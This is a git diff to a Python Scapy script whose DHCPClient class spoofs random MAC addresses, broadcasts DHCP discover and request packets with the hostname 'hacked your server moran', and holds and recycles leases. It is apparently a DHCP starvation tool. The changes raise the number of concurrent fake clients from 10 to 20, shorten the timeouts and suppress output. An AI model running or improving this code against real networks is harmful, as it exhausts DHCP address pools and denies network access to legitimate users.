@@ -9,7 +9,7 @@ from enum import Enum
 class DHCPStatus(Enum):
     DISCOVER=0
     REQUEST=1
-    MANTIN0 = 2
+    MANTAIN0 = 2
     MANTAIN50=3
     MANTAIN87=4
     RECYCLE = 5
@@ -23,17 +23,17 @@ class DHCPClient:
 	__srcPort__ = 68 
 	__BROADCASTMAC__ = "ff:ff:ff:ff:ff:ff"
 	__BROADCASTIP__ = "255.255.255.255"
-	
+	__DEFAULTIP__="0.0.0.0"
  
 	def reset():
 		DHCPClient.aborted = -1 
 		DHCPClient.__onAir__=0  #mini lock to prevent more then 10 at a time 
-		DHCPClient.__count__=0	 
-  
+ 
 	def __init__(self , iface : str  = None  , target : str = None ) : 
 		self.mac = str(RandMAC())
-		self.ip = "0.0.0.0" 
+		self.ip = DHCPClient.__DEFAULTIP__
 		self.stat = DHCPStatus.DISCOVER
+		self.mantian = False
 		DHCPClient.__count__+=1
 		self.time=None 
 		self.curTime = None
@@ -50,9 +50,12 @@ class DHCPClient:
         }
 
 	def to_trash(self):
-		DHCPClient.aborted = -1 
-		DHCPClient.__onAir__=0  #mini lock to prevent more then 10 at a time 
-		self.stat =  DHCPStatus(self.stat.value+1)
+		self.ip = DHCPClient.__DEFAULTIP__
+		self.time = None 
+		self.curTime = None 
+		self.stat =DHCPStatus.DISCOVER
+		self.mantian = True
+		return self.discover()
 
 	def re_requestyou(self):
 		Frame = Ether(src = self.mac , dst = self.__server__["mac"] ) 
@@ -88,13 +91,14 @@ class DHCPClient:
 		'end'])
 		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
 		print("sending")
-		ack = srp1(pack,iface=self.__settings__["interface"])
+		ack = srp1(pack,iface=self.__settings__["interface"],verbose=False)
 		optionsAck = ack[DHCP].options 
 		for i in optionsAck : 
 			if i[0] == "lease_time":
 				self.time  = i[1]
 				self.curTime = time.time()
-				self.stat = DHCPStatus.MANTIN0
+				self.stat = DHCPStatus.MANTAIN0
+				self.mantian = False 
 				break 
 		print(f"ack {self.name }  : {self.time}/ { ack.summary()}") 
 		DHCPClient.__onAir__-=1
@@ -109,7 +113,7 @@ class DHCPClient:
   
   			,
           	prn=self.__requestyou__,
-          	count=1,timeout= 10 ) 
+          	count=1,timeout= 5 ) 
 		print(f" pack : { self.name } : {pack } : { len(pack)}  ")
 		if  len(pack) ==0   : 
 			print(f"anonded {self.name}" ) 
@@ -118,23 +122,20 @@ class DHCPClient:
 
 	def discover(self)-> Thread:  
 		'''Discovers DHCP servers and starts connection process with them  '''
-		while(DHCPClient.__onAir__ >= 10 ):
+		while(DHCPClient.__onAir__ >= 20 and not self.mantian):
 			if(DHCPClient.aborted != -1 ) :
-				return 
+				return None
 		DHCPClient.__onAir__+=1 
-		print(f"{self.name} : {self.mac}" )  
 		Frame = Ether(dst = DHCPClient.__BROADCASTMAC__, src = self.mac) 
 		Datagram = IP( dst = DHCPClient.__BROADCASTIP__, src= self.ip  ) 
 		Segment = UDP(dport= DHCPClient.__dstPort__,sport=DHCPClient.__srcPort__)
 		Bootp = BOOTP(chaddr=mac2str(self.mac) , xid = RandInt()) 
-		DHCPPACK = DHCP ( options = [
-		('message-type','discover'),
-		('hostname','hacked your server moran ;)IDHM;) '),
-		'end'] )
+		DHCPPACK = DHCP ( options = [('message-type','discover'),('hostname','hacked your server moran ;)IDHM;) '),'end'] )
 		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
 		tr = Thread(target=self.__offerme__)
 		tr.start()
-		sendp(pack,iface=self.__settings__["interface"])
+		sendp(pack,iface=self.__settings__["interface"],verbose=False)
 		return tr 
 		
-
+	def valid(self):
+		return self.ip != DHCPClient.__DEFAULTIP__ or self.mantian
